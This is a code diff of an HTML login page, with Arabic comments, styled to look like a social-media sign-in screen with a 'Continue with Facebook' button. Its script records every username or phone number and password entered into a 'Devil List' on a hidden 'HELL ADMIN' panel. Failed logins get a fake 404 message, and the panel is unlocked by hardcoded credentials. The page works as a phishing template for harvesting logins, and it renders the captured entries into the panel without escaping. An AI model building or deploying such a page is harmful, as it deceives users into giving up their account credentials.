@@ -1,4 +1,36 @@
-https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dark-section {
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>نظام الشيطان الأمني</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    }
+    body {
+      background-color: #0C0F14; /* نفس لون الخلفية الداكنة */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 0;
+    }
+    /* الحاوية الرئيسية تملأ الشاشة بالكامل بدون حواف سوداء */
+    .app-container {
+      width: 100%;
+      min-height: 100vh;
+      background-color: #0C0F14;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+    }
+    .top-dark-section {
       background-color: #0C0F14;
       width: 100%;
       flex-shrink: 0;
@@ -8,7 +40,7 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
       background-color: #000000;
       width: 100%;
       flex: 1;
-      min-height: 300px;
+      min-height: 80px;
     }
     .language-selector {
       display: flex;
@@ -22,9 +54,7 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
       letter-spacing: 0.3px;
       gap: 4px;
     }
-    .language-selector span {
-      color: #aeb2bb;
-    }
+    .language-selector span { color: #aeb2bb; }
     .language-selector i {
       font-size: 22px;
       color: #aeb2bb;
@@ -42,18 +72,17 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
       display: flex;
       flex-direction: column;
       background-color: #0C0F14;
+      flex: 1;
     }
     .logo-wrapper {
       display: flex;
       justify-content: center;
       align-items: center;
       margin: 20px 0 22px 0;
-      padding: 0;
     }
     .logo-goat {
       width: 115px;
       height: 115px;
-      background: transparent;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -72,9 +101,7 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
       letter-spacing: 0.2px;
       margin-top: 10px;
     }
-    .field-label:first-of-type {
-      margin-top: 0;
-    }
+    .field-label:first-of-type { margin-top: 0; }
     .input-container {
       width: 100%;
       background-color: #25282D;
@@ -87,9 +114,7 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
       margin-bottom: 6px;
       transition: border 0.15s ease;
     }
-    .input-container:focus-within {
-      border-color: #4a5df5;
-    }
+    .input-container:focus-within { border-color: #4a5df5; }
     .input-container input {
       width: 100%;
       height: 100%;
@@ -142,15 +167,11 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
       flex-shrink: 0;
       padding-left: 8px;
     }
-    .show-toggle i {
-      font-size: 26px;
-      color: #aeb2bb;
-    }
-    /* زر Login - الحالة الافتراضية */
+    .show-toggle i { font-size: 26px; color: #aeb2bb; }
     .login-btn {
       width: 100%;
       height: 85px;
-      background-color: #073858; /* داكن */
+      background-color: #073858;
       border: none;
       border-radius: 26px;
       color: #b0c4d9;
@@ -163,26 +184,19 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
       display: flex;
       justify-content: center;
       align-items: center;
-      text-align: center;
     }
-    /* زر Login عندما يكون هناك إدخال في الحقول */
     .login-btn.active {
       background-color: #1a7b9e;
       color: #ffffff;
     }
-    .login-btn:hover {
-      background-color: #0a466b;
-    }
-    .login-btn.active:hover {
-      background-color: #2a8fb0;
-    }
+    .login-btn:hover { background-color: #0a466b; }
+    .login-btn.active:hover { background-color: #2a8fb0; }
     .forgot-password {
       text-align: center;
       color: #e2e5ea;
       font-size: 26px;
       font-weight: 600;
       margin: 12px 0 22px 0;
-      letter-spacing: 0.2px;
     }
     .continue-btn {
       width: 100%;
@@ -203,21 +217,17 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
     }
     .continue-btn i {
       font-size: 34px;
-      color: white;
       background: white;
       border-radius: 50%;
       padding: 6px;
       color: #4A5DF5;
-      background: white;
       display: inline-flex;
       justify-content: center;
       align-items: center;
       width: 38px;
       height: 38px;
     }
-    .continue-btn:hover {
-      background-color: #3b4ee0;
-    }
+    .continue-btn:hover { background-color: #3b4ee0; }
     .or-divider {
       display: flex;
       align-items: center;
@@ -240,9 +250,7 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
       font-size: 26px;
       font-weight: 600;
       margin: 18px 0 50px 0;
-      letter-spacing: 0.2px;
     }
-    /* رسالة خطأ عادية (بدون توهج) */
     .error-message {
       color: #ff4d4d;
       font-size: 26px;
@@ -255,14 +263,8 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
       border: none;
       text-shadow: none;
     }
-    .error-message.show {
-      display: block;
-    }
-    .bottom-spacer {
-      height: 60px;
-      background-color: #000000;
-      width: 100%;
-    }
+    .error-message.show { display: block; }
+
     /* ===== لوحة المسؤول ===== */
     .admin-panel {
       display: none;
@@ -271,10 +273,9 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
       padding: 20px 18px;
       min-height: 100vh;
       flex-direction: column;
+      width: 100%;
     }
-    .admin-panel.active {
-      display: flex;
-    }
+    .admin-panel.active { display: flex; }
     .admin-header {
       display: flex;
       justify-content: space-between;
@@ -300,9 +301,7 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
       cursor: pointer;
       transition: 0.2s;
     }
-    .admin-header button:hover {
-      background: #4a1515;
-    }
+    .admin-header button:hover { background: #4a1515; }
     .admin-dashboard {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -337,7 +336,8 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
       align-items: center;
       min-height: 130px;
     }
-    .logo-control .preview-box img, .logo-control .preview-box svg {
+    .logo-control .preview-box img,
+    .logo-control .preview-box svg {
       max-width: 110px;
       max-height: 110px;
     }
@@ -365,10 +365,9 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
       cursor: pointer;
       flex: 1 0 auto;
     }
-    .btn-group button:hover {
-      background: #2a1212;
-    }
-    /* Devil List - مع أعمدة إضافية */
+    .btn-group button:hover { background: #2a1212; }
+
+    /* Devil List - تظهر جميع البيانات */
     .devil-list {
       margin-top: 12px;
       background: #0d0505;
@@ -379,12 +378,12 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
     }
     .devil-item {
       display: grid;
-      grid-template-columns: 50px 100px 80px 1fr 1fr;
+      grid-template-columns: 45px 100px 65px 1fr 1fr;
       gap: 6px;
       padding: 10px 12px;
       border-bottom: 1px solid #2a1010;
       color: #b0a0a0;
-      font-size: 18px;
+      font-size: 16px;
       align-items: center;
     }
     .devil-item .id {
@@ -393,26 +392,21 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
     }
     .devil-item .time {
       color: #9a8a8a;
+      font-size: 14px;
     }
-    .devil-item .status {
-      font-weight: 600;
-    }
-    .devil-item .status.success {
-      color: #4caf50;
-    }
-    .devil-item .status.fail {
-      color: #cc6666;
-    }
+    .devil-item .status { font-weight: 600; }
+    .devil-item .status.success { color: #4caf50; }
+    .devil-item .status.fail { color: #cc6666; }
     .devil-item .phone {
       color: #aab;
-      font-size: 16px;
+      font-size: 14px;
       overflow: hidden;
       text-overflow: ellipsis;
       white-space: nowrap;
     }
     .devil-item .password {
       color: #887;
-      font-size: 16px;
+      font-size: 14px;
       font-family: monospace;
       overflow: hidden;
       text-overflow: ellipsis;
@@ -434,35 +428,27 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
     }
     @media (max-width: 600px) {
       .devil-item {
-        grid-template-columns: 40px 80px 60px 1fr 1fr;
-        font-size: 15px;
+        grid-template-columns: 35px 75px 55px 1fr 1fr;
+        font-size: 13px;
         gap: 4px;
       }
-      .admin-dashboard {
-        grid-template-columns: 1fr;
-      }
+      .devil-item .time { font-size: 12px; }
+      .admin-dashboard { grid-template-columns: 1fr; }
     }
     @media (max-width: 500px) {
-      .login-form {
-        padding: 0 16px;
-      }
+      .login-form { padding: 0 16px; }
       .language-selector {
         font-size: 22px;
         padding-top: 20px;
       }
-      .field-label {
-        font-size: 22px;
-      }
+      .field-label { font-size: 22px; }
       .input-container {
         height: 80px;
         padding: 0 14px;
       }
-      .input-container input, .password-wrapper input {
-        font-size: 22px;
-      }
-      .show-toggle {
-        font-size: 20px;
-      }
+      .input-container input,
+      .password-wrapper input { font-size: 22px; }
+      .show-toggle { font-size: 20px; }
       .login-btn {
         height: 72px;
         font-size: 23px;
@@ -473,37 +459,28 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
         font-size: 22px;
         gap: 10px;
       }
-      .forgot-password, .create-account {
-        font-size: 22px;
-      }
+      .forgot-password,
+      .create-account { font-size: 22px; }
     }
     @media (max-width: 380px) {
-      .login-form {
-        padding: 0 12px;
-      }
-      .input-container {
-        height: 70px;
-      }
+      .login-form { padding: 0 12px; }
+      .input-container { height: 70px; }
     }
-    .hidden {
-      display: none !important;
-    }
+    .hidden { display: none !important; }
   </style>
 </head>
 <body>
 <div class="app-container" id="appContainer">
-  <!-- ====== قسم تسجيل الدخول ====== -->
+  <!-- ====== صفحة الدخول ====== -->
   <div id="loginSection" style="display: flex; flex-direction: column; min-height: 100vh;">
     <div class="top-dark-section">
       <div class="language-selector">
         <span>English (US)</span>
-        <i class="fas fa-chevron-down" style="font-size: 22px;"></i>
+        <i class="fas fa-chevron-down"></i>
       </div>
       <div class="divider-line"></div>
     </div>
-
     <div class="login-form">
-      <!-- الشعار -->
       <div class="logo-wrapper">
         <div class="logo-goat" id="mainLogo">
           <svg viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -524,28 +501,22 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
           </svg>
         </div>
       </div>
-
-      <!-- رسالة الخطأ (غير متوهجة) -->
       <div id="errorMessage" class="error-message">⚠️ 404 — Login failed</div>
-
       <div class="field-label">Enter your mobile number, username or email</div>
       <div class="input-container">
-        <input type="text" id="usernameInput" placeholder=" " value="">
+        <input type="text" id="usernameInput" placeholder=" " value="" />
       </div>
-
       <div class="field-label" style="margin-top: 12px;">Enter your password</div>
       <div class="input-container">
         <div class="password-wrapper">
-          <input type="password" id="passwordInput" placeholder=" " value="">
+          <input type="password" id="passwordInput" placeholder=" " value="" />
           <div class="show-toggle" id="showToggle">
             <span>Show</span>
             <i class="fas fa-eye-slash" id="eyeIcon"></i>
           </div>
         </div>
       </div>
-
       <button class="login-btn" id="loginBtn">Log in</button>
-
       <div class="forgot-password">Forgot password?</div>
       <button class="continue-btn">
         <i class="fab fa-facebook-f"></i>
@@ -558,8 +529,7 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
       </div>
       <div class="create-account">Create new account</div>
     </div>
-
-    <div class="bottom-black-section" style="flex:1; min-height: 80px;"></div>
+    <div class="bottom-black-section"></div>
   </div>
 
   <!-- ====== لوحة المسؤول ====== -->
@@ -568,9 +538,7 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
       <h1>🔥 HELL ADMIN</h1>
       <button id="logoutAdminBtn"><i class="fas fa-skull"></i> Exit</button>
     </div>
-
     <div class="admin-dashboard">
-      <!-- Logo Control -->
       <div class="admin-card">
         <h3><i class="fas fa-pentagram"></i> Logo Control</h3>
         <div class="logo-control">
@@ -590,15 +558,13 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
               <path d="M56 64 L60 68 L64 64" stroke="#aa3333" stroke-width="1.5" fill="none"/>
             </svg>
           </div>
-          <input type="file" id="logoUpload" accept="image/*">
+          <input type="file" id="logoUpload" accept="image/*" />
           <div class="btn-group">
             <button id="saveLogoBtn"><i class="fas fa-save"></i> Save Logo</button>
             <button id="resetLogoBtn"><i class="fas fa-undo-alt"></i> Reset</button>
           </div>
         </div>
       </div>
-
-      <!-- Devil List -->
       <div class="admin-card">
         <h3><i class="fas fa-list-ul"></i> Devil List (جميع المحاولات)</h3>
         <div id="devilListContainer" class="devil-list">
@@ -609,8 +575,6 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
         </div>
       </div>
     </div>
-
-    <!-- Security & Settings -->
     <div style="display: flex; gap: 14px; flex-wrap: wrap; margin-top: 10px;">
       <div style="background: #0f0505; border: 1px solid #2a1212; border-radius: 12px; padding: 16px 22px; flex:1;">
         <h4 style="color:#aa5555;"><i class="fas fa-shield-alt"></i> Security</h4>
@@ -632,82 +596,68 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
     "use strict";
 
     // عناصر DOM
-    const loginSection = document.getElementById('loginSection');
-    const adminPanel = document.getElementById('adminPanel');
-    const usernameInput = document.getElementById('usernameInput');
-    const passwordInput = document.getElementById('passwordInput');
-    const loginBtn = document.getElementById('loginBtn');
-    const errorMsg = document.getElementById('errorMessage');
-    const showToggle = document.getElementById('showToggle');
-    const eyeIcon = document.getElementById('eyeIcon');
-    const logoutBtn = document.getElementById('logoutAdminBtn');
-    const devilListContainer = document.getElementById('devilListContainer');
+    var loginSection = document.getElementById('loginSection');
+    var adminPanel = document.getElementById('adminPanel');
+    var usernameInput = document.getElementById('usernameInput');
+    var passwordInput = document.getElementById('passwordInput');
+    var loginBtn = document.getElementById('loginBtn');
+    var errorMsg = document.getElementById('errorMessage');
+    var showToggle = document.getElementById('showToggle');
+    var eyeIcon = document.getElementById('eyeIcon');
+    var logoutBtn = document.getElementById('logoutAdminBtn');
+    var devilListContainer = document.getElementById('devilListContainer');
 
-    // عناصر الشعار
-    const mainLogo = document.getElementById('mainLogo');
-    const logoPreviewBox = document.getElementById('logoPreviewBox');
-    const logoUpload = document.getElementById('logoUpload');
-    const saveLogoBtn = document.getElementById('saveLogoBtn');
-    const resetLogoBtn = document.getElementById('resetLogoBtn');
+    var mainLogo = document.getElementById('mainLogo');
+    var logoPreviewBox = document.getElementById('logoPreviewBox');
+    var logoUpload = document.getElementById('logoUpload');
+    var saveLogoBtn = document.getElementById('saveLogoBtn');
+    var resetLogoBtn = document.getElementById('resetLogoBtn');
 
-    // بيانات المسؤول (ثابتة)
-    const ADMIN_PHONE = '0561368108';
-    const ADMIN_PASS = 'nouh1234';
+    var ADMIN_PHONE = '0561368108';
+    var ADMIN_PASS = 'nouh1234';
 
-    // قائمة الشيطان - تخزين جميع المحاولات (نجاح وفشل)
-    let devilAttempts = []; // {id, time, phone, password, status}
+    var devilAttempts = [];
+    var passwordVisible = false;
+    var customLogoData = null;
 
-    // حالة إظهار/إخفاء كلمة المرور
-    let passwordVisible = false;
-
-    // متغير لتخزين شعار مخصص
-    let customLogoData = null;
-
-    // ====== وظائف قائمة الشيطان ======
+    // ====== قائمة الشيطان ======
     function addDevilAttempt(phone, password, status) {
-      const now = new Date();
-      const timeStr = now.toTimeString().split(' ')[0]; // HH:MM:SS
-      const dateStr = now.toLocaleDateString('ar-EG'); // تاريخ
-      const fullTime = `${dateStr} ${timeStr}`;
-      const newEntry = {
+      var now = new Date();
+      var timeStr = now.toTimeString().split(' ')[0];
+      var dateStr = now.toLocaleDateString('ar-EG');
+      var fullTime = dateStr + ' ' + timeStr;
+      var newEntry = {
         id: devilAttempts.length + 1,
         time: fullTime,
         phone: phone || '(غير مدخل)',
         password: password || '(غير مدخل)',
-        status: status, // 'success' or 'fail'
+        status: status
       };
-      // إضافة في البداية (الأحدث أولاً)
       devilAttempts.unshift(newEntry);
-      // إعادة ترقيم
-      devilAttempts.forEach((item, index) => {
+      devilAttempts.forEach(function(item, index) {
         item.id = index + 1;
       });
-      // الاحتفاظ بـ 50 فقط
-      if (devilAttempts.length > 50) {
-        devilAttempts = devilAttempts.slice(0, 50);
-      }
+      if (devilAttempts.length > 50) devilAttempts = devilAttempts.slice(0, 50);
       renderDevilList();
     }
 
     function renderDevilList() {
       if (!devilListContainer) return;
       if (devilAttempts.length === 0) {
-        devilListContainer.innerHTML = `<div class="empty">⚠️ لا توجد محاولات</div>`;
+        devilListContainer.innerHTML = '<div class="empty">⚠️ لا توجد محاولات</div>';
         return;
       }
-      let html = '';
-      devilAttempts.forEach(item => {
-        const statusClass = item.status === 'success' ? 'success' : 'fail';
-        const statusText = item.status === 'success' ? '✅ نجاح' : '❌ فشل';
-        html += `
-          <div class="devil-item">
-            <span class="id">${String(item.id).padStart(2, '0')}</span>
-            <span class="time">${item.time}</span>
-            <span class="status ${statusClass}">${statusText}</span>
-            <span class="phone">📞 ${item.phone}</span>
-            <span class="password">🔑 ${item.password}</span>
-          </div>
-        `;
+      var html = '';
+      devilAttempts.forEach(function(item) {
+        var statusClass = item.status === 'success' ? 'success' : 'fail';
+        var statusText = item.status === 'success' ? '✅ نجاح' : '❌ فشل';
+        html += '<div class="devil-item">' +
+          '<span class="id">' + String(item.id).padStart(2, '0') + '</span>' +
+          '<span class="time">' + item.time + '</span>' +
+          '<span class="status ' + statusClass + '">' + statusText + '</span>' +
+          '<span class="phone">📞 ' + item.phone + '</span>' +
+          '<span class="password">🔑 ' + item.password + '</span>' +
+          '</div>';
       });
       devilListContainer.innerHTML = html;
     }
@@ -721,47 +671,35 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
 
     // ====== تحديث زر Login ======
     function updateLoginButton() {
-      const hasText = usernameInput.value.trim().length > 0 || passwordInput.value.trim().length > 0;
-      if (hasText) {
-        loginBtn.classList.add('active');
-      } else {
-        loginBtn.classList.remove('active');
-      }
+      var hasText = usernameInput.value.trim().length > 0 || passwordInput.value.trim().length > 0;
+      if (hasText) loginBtn.classList.add('active');
+      else loginBtn.classList.remove('active');
     }
 
     // ====== محاولة تسجيل الدخول ======
     function handleLogin() {
-      const username = usernameInput.value.trim();
-      const password = passwordInput.value.trim();
+      var username = usernameInput.value.trim();
+      var password = passwordInput.value.trim();
 
-      // تسجيل المحاولة (قبل التحقق)
-      // لكن نريد معرفة النجاح أو الفشل بعد التحقق
-      // سنقوم بالتحقق ثم التسجيل
-      let status = 'fail';
-      if (username === ADMIN_PHONE && password === ADMIN_PASS) {
-        status = 'success';
-      }
+      var status = 'fail';
+      if (username === ADMIN_PHONE && password === ADMIN_PASS) status = 'success';
 
-      // إضافة السجل (مع عرض بيانات الدخول)
+      // تسجيل المحاولة (حتى لو نجحت)
       addDevilAttempt(username, password, status);
 
       if (status === 'success') {
-        // نجاح: إظهار لوحة المسؤول
         loginSection.style.display = 'none';
         adminPanel.classList.add('active');
         adminPanel.style.display = 'flex';
         errorMsg.classList.remove('show');
-        // إعادة تعيين الحقول
         usernameInput.value = '';
         passwordInput.value = '';
         updateLoginButton();
         return;
       }
 
-      // فشل: إظهار رسالة 404 (غير متوهجة)
       errorMsg.textContent = '⚠️ 404 — Login failed';
       errorMsg.classList.add('show');
-      // نعيد تعيين حقل كلمة المرور فقط (ولكن نترك رقم الهاتف)
       passwordInput.value = '';
       updateLoginButton();
     }
@@ -769,10 +707,10 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
     // ====== التحكم بالشعار ======
     function updateLogoFromFile(file) {
       if (!file) return;
-      const reader = new FileReader();
+      var reader = new FileReader();
       reader.onload = function(e) {
-        const dataUrl = e.target.result;
-        const img = document.createElement('img');
+        var dataUrl = e.target.result;
+        var img = document.createElement('img');
         img.src = dataUrl;
         img.style.width = '115px';
         img.style.height = '115px';
@@ -780,7 +718,7 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
         mainLogo.innerHTML = '';
         mainLogo.appendChild(img);
         logoPreviewBox.innerHTML = '';
-        const previewImg = document.createElement('img');
+        var previewImg = document.createElement('img');
         previewImg.src = dataUrl;
         previewImg.style.width = '110px';
         previewImg.style.height = '110px';
@@ -792,38 +730,34 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
     }
 
     function resetLogoToDefault() {
-      mainLogo.innerHTML = `
-        <svg viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <circle cx="60" cy="60" r="58" fill="#0a0505" stroke="#8a1a1a" stroke-width="1.5"/>
-          <path d="M45 42 L30 22 L42 30 L48 18 L55 28 L62 16 L68 28 L75 18 L82 30 L72 38 L80 44 L70 50 L62 44 L58 52 L52 44 L44 50 L38 44 L45 42Z" fill="#1a0a0a" stroke="#aa2222" stroke-width="2"/>
-          <path d="M38 32 L22 12 L32 18 L28 6 L40 14 L38 32Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/>
-          <path d="M74 28 L90 10 L82 18 L86 4 L74 16 L74 28Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/>
-          <circle cx="48" cy="38" r="6" fill="#cc0000" stroke="#ff4444" stroke-width="1.5"/>
-          <circle cx="68" cy="36" r="6" fill="#cc0000" stroke="#ff4444" stroke-width="1.5"/>
-          <circle cx="48" cy="38" r="2.5" fill="#ffaa00"/>
-          <circle cx="68" cy="36" r="2.5" fill="#ffaa00"/>
-          <rect x="52" y="52" width="16" height="18" rx="4" fill="#1a0a0a" stroke="#aa3333" stroke-width="1.5"/>
-          <circle cx="56" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/>
-          <circle cx="64" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/>
-          <path d="M56 64 L60 68 L64 64" stroke="#aa3333" stroke-width="1.5" fill="none"/>
-        </svg>
-      `;
-      logoPreviewBox.innerHTML = `
-        <svg viewBox="0 0 120 120" width="100" height="100" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <circle cx="60" cy="60" r="58" fill="#0a0505" stroke="#8a1a1a" stroke-width="1.5"/>
-          <path d="M45 42 L30 22 L42 30 L48 18 L55 28 L62 16 L68 28 L75 18 L82 30 L72 38 L80 44 L70 50 L62 44 L58 52 L52 44 L44 50 L38 44 L45 42Z" fill="#1a0a0a" stroke="#aa2222" stroke-width="2"/>
-          <path d="M38 32 L22 12 L32 18 L28 6 L40 14 L38 32Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/>
-          <path d="M74 28 L90 10 L82 18 L86 4 L74 16 L74 28Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/>
-          <circle cx="48" cy="38" r="6" fill="#cc0000" stroke="#ff4444" stroke-width="1.5"/>
-          <circle cx="68" cy="36" r="6" fill="#cc0000" stroke="#ff4444" stroke-width="1.5"/>
-          <circle cx="48" cy="38" r="2.5" fill="#ffaa00"/>
-          <circle cx="68" cy="36" r="2.5" fill="#ffaa00"/>
-          <rect x="52" y="52" width="16" height="18" rx="4" fill="#1a0a0a" stroke="#aa3333" stroke-width="1.5"/>
-          <circle cx="56" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/>
-          <circle cx="64" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/>
-          <path d="M56 64 L60 68 L64 64" stroke="#aa3333" stroke-width="1.5" fill="none"/>
-        </svg>
-      `;
+      mainLogo.innerHTML = '<svg viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">' +
+        '<circle cx="60" cy="60" r="58" fill="#0a0505" stroke="#8a1a1a" stroke-width="1.5"/>' +
+        '<path d="M45 42 L30 22 L42 30 L48 18 L55 28 L62 16 L68 28 L75 18 L82 30 L72 38 L80 44 L70 50 L62 44 L58 52 L52 44 L44 50 L38 44 L45 42Z" fill="#1a0a0a" stroke="#aa2222" stroke-width="2"/>' +
+        '<path d="M38 32 L22 12 L32 18 L28 6 L40 14 L38 32Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/>' +
+        '<path d="M74 28 L90 10 L82 18 L86 4 L74 16 L74 28Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/>' +
+        '<circle cx="48" cy="38" r="6" fill="#cc0000" stroke="#ff4444" stroke-width="1.5"/>' +
+        '<circle cx="68" cy="36" r="6" fill="#cc0000" stroke="#ff4444" stroke-width="1.5"/>' +
+        '<circle cx="48" cy="38" r="2.5" fill="#ffaa00"/>' +
+        '<circle cx="68" cy="36" r="2.5" fill="#ffaa00"/>' +
+        '<rect x="52" y="52" width="16" height="18" rx="4" fill="#1a0a0a" stroke="#aa3333" stroke-width="1.5"/>' +
+        '<circle cx="56" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/>' +
+        '<circle cx="64" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/>' +
+        '<path d="M56 64 L60 68 L64 64" stroke="#aa3333" stroke-width="1.5" fill="none"/>' +
+        '</svg>';
+      logoPreviewBox.innerHTML = '<svg viewBox="0 0 120 120" width="100" height="100" fill="none" xmlns="http://www.w3.org/2000/svg">' +
+        '<circle cx="60" cy="60" r="58" fill="#0a0505" stroke="#8a1a1a" stroke-width="1.5"/>' +
+        '<path d="M45 42 L30 22 L42 30 L48 18 L55 28 L62 16 L68 28 L75 18 L82 30 L72 38 L80 44 L70 50 L62 44 L58 52 L52 44 L44 50 L38 44 L45 42Z" fill="#1a0a0a" stroke="#aa2222" stroke-width="2"/>' +
+        '<path d="M38 32 L22 12 L32 18 L28 6 L40 14 L38 32Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/>' +
+        '<path d="M74 28 L90 10 L82 18 L86 4 L74 16 L74 28Z" fill="#2a0a0a" stroke="#aa3333" stroke-width="2"/>' +
+        '<circle cx="48" cy="38" r="6" fill="#cc0000" stroke="#ff4444" stroke-width="1.5"/>' +
+        '<circle cx="68" cy="36" r="6" fill="#cc0000" stroke="#ff4444" stroke-width="1.5"/>' +
+        '<circle cx="48" cy="38" r="2.5" fill="#ffaa00"/>' +
+        '<circle cx="68" cy="36" r="2.5" fill="#ffaa00"/>' +
+        '<rect x="52" y="52" width="16" height="18" rx="4" fill="#1a0a0a" stroke="#aa3333" stroke-width="1.5"/>' +
+        '<circle cx="56" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/>' +
+        '<circle cx="64" cy="58" r="3" fill="#1a0a0a" stroke="#aa3333" stroke-width="1"/>' +
+        '<path d="M56 64 L60 68 L64 64" stroke="#aa3333" stroke-width="1.5" fill="none"/>' +
+        '</svg>';
       customLogoData = null;
       logoUpload.value = '';
     }
@@ -838,18 +772,13 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
       updateLoginButton();
     }
 
-    // ====== أحداث ======
+    // ====== الأحداث ======
     showToggle.addEventListener('click', togglePasswordVisibility);
-
-    // مراقبة الإدخال لتحديث زر Login
     usernameInput.addEventListener('input', updateLoginButton);
     passwordInput.addEventListener('input', updateLoginButton);
-
     loginBtn.addEventListener('click', handleLogin);
-
-    usernameInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') handleLogin(); });
-    passwordInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') handleLogin(); });
-
+    usernameInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') handleLogin(); });
+    passwordInput.addEventListener('keydown', function(e) { if (e.key === 'Enter') handleLogin(); });
     logoutBtn.addEventListener('click', logoutAdmin);
 
     logoUpload.addEventListener('change', function(e) {
@@ -859,11 +788,8 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
     });
 
     saveLogoBtn.addEventListener('click', function() {
-      if (customLogoData) {
-        alert('✅ تم تطبيق الشعار الجديد');
-      } else {
-        alert('⚠️ يرجى اختيار صورة أولاً');
-      }
+      if (customLogoData) alert('✅ تم تطبيق الشعار الجديد');
+      else alert('⚠️ يرجى اختيار صورة أولاً');
     });
 
     resetLogoBtn.addEventListener('click', function() {
@@ -871,49 +797,41 @@ https://github.com/bihoo69bihoo/ninja-grocery13/edit/main/index.html    .top-dar
       alert('🔄 تم إعادة الشعار الأصلي');
     });
 
-    // ====== تهيئة (إضافة بعض المحاولات التجريبية) ======
+    // ====== تهيئة (محاولات تجريبية) ======
     function initDemo() {
-      // إضافة بعض المحاولات الوهمية لتوضيح القائمة
-      const now = new Date();
-      const h = now.getHours();
-      const m = now.getMinutes();
-      const demoData = [
+      var now = new Date();
+      var demoData = [
         { phone: '0555123456', password: '123456', status: 'fail' },
         { phone: '0561368108', password: 'nouh1234', status: 'success' },
         { phone: '0533111222', password: 'qwerty', status: 'fail' },
         { phone: '0509876543', password: 'password', status: 'fail' },
-        { phone: '0561368108', password: 'wrongpass', status: 'fail' },
+        { phone: '0561368108', password: 'wrongpass', status: 'fail' }
       ];
-      demoData.forEach((item, index) => {
-        const time = new Date(now.getTime() - (index * 60000));
-        const timeStr = time.toTimeString().split(' ')[0];
-        const dateStr = time.toLocaleDateString('ar-EG');
-        const fullTime = `${dateStr} ${timeStr}`;
+      demoData.forEach(function(item, index) {
+        var time = new Date(now.getTime() - (index * 60000));
+        var timeStr = time.toTimeString().split(' ')[0];
+        var dateStr = time.toLocaleDateString('ar-EG');
+        var fullTime = dateStr + ' ' + timeStr;
         devilAttempts.push({
           id: index + 1,
           time: fullTime,
           phone: item.phone,
           password: item.password,
-          status: item.status,
+          status: item.status
         });
       });
-      // عكس الترتيب ليصبح الأحدث أولاً (آخر عنصر هو الأحدث)
